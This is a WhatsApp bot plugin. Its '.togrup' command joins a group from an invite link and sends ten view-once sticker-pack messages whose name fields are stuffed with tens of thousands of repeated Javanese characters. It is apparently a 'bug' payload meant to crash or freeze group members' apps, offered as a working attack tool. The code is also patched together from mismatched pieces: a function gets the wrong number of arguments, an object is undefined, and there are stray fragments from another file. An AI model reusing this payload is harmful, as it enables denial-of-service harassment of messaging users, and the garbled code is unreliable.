let handler = async (m, { conn, args }) => {
  const link = args[0];

  if (!link || !link.includes('chat.whatsapp.com/')) {
    return m.reply('📎 *Debes proporcionar un enlace de grupo válido.*\n\nEjemplo: .togrup https://chat.whatsapp.com/xxxxxxxxxxxx');
  }

  const code = link.split('/').pop().trim();
  let groupJid;

  try {
    groupJid = await conn.groupAcceptInvite(code);
    await delay(1500);
    await m.reply(`✅ *Bot unido al grupo correctamente.*`);
  } catch (e) {
    try {
      const info = await conn.groupGetInviteInfo(code);
      groupJid = info.id;
    } catch (err) {
      return m.reply('❌ *No se pudo acceder al grupo.*');
    }
  }

  // 🌀 Ejecuta las funciones 10 veces
  for (let i = 0; i < 10; i++) {
    try {
      await Blank_Pack(conn, groupJid);
      await delay(300);
    } catch (err) {
      console.log(`[ERROR EN ENVÍO ${i + 1}]`, err);
    }
  }

  await m.reply('✅ *Comando ejecutado con éxito.*');
};

handler.command = ['togrup'];
handler.owner = false;
handler.bot = false;

export default handler;

// 🧱 Función DelayStc adaptada
async function Blank_Pack(target) {
let memeknya = "ꦾ".repeat(50000) + " ꦽ".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
  stickerPackMessage: {
    stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
    name: "Ken Blank" + memeknya,
    publisher: memeknya + `ꦾ`.repeat(5000),
    stickers: [
      {
        fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      },
      {
        fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      }
    ],
    fileLength: "69832",
    fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
    fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
    mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
    directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
    contextInfo: {},
    mediaKeyTimestamp: "1746459896",
    trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
    thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
    thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
    thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
    thumbnailHeight: 252,
    thumbnailWidth: 252,
    imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
    stickerPackSize: "69233",
    stickerPackOrigin: "USER_CREATED"
              },
            },
          },
        }),
        {
          userJid: target,
        }
      );
await Ken.relayMessage(target, messageContent.message, {
        participant: {
          jid: target,
        },
        messageId: messageContent.key.id,
      });
      console.log(chalk.green(`Send Bug By Ken : ${target}`));
    }

const example = async (teks) => {
const commander = ` *Contoh Command :*\n*${cmd}* ${teks}`
return m.reply(commander)
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`FROM`), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.blue.bold(`TEXT :`), chalk.blue.bold(`${cmd}`))
}

// 🕒 Delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}